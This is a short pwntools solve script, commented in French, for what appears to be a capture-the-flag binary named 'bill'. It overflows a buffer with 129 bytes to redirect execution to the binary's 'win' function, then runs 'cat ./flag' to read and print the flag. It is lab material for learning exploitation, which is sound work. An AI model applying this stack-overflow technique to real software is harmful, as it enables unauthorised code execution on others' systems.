from pwn import p32, process, ELF


def get_win_addr(binary_path: str) -> int:
    elf = ELF(binary_path)
    # L'adresse de la fonction win (récupérée depuis les symboles)
    return elf.symbols["win"]


def buffer_overflow(binary_path: str, offset: int, win_addr: int) -> str:
    io = process(binary_path)
    # Produit le buffer overflow
    payload = b"0" * offset
    payload += p32(win_addr)
    io.sendline(payload)
    # Ignore la ligne retournée par le binaire
    io.recvline()
    # Lis le flag et affiche la sortie
    io.sendline(b"cat ./flag")
    flag = io.recvall(timeout=0.1)
    return flag.decode().strip()


if __name__ == "__main__":
    binary_path = "./bill"
    win_addr = get_win_addr(binary_path)
    # Offset obtenu avec gdb et la commande cyclic -l
    flag = buffer_overflow(binary_path, offset=129, win_addr=win_addr)
    print(f"Flag: {flag}")
